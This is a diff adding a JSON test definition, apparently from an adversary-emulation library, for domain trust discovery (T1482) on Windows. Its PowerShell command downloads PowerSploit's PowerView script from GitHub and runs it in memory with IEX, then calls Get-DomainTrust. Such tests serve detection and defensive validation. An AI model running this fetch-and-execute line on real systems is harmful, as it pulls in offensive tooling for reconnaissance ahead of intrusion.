@@ -1,0 +1,23 @@
+{
+    "name": "Get-DomainTrust with PowerView",
+    "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1482",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "Domain Trust Discovery",
+    "source": "ART",
+    "uuid": "f974894c-5991-4b19-aaf5-7cc2fe298c5d",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
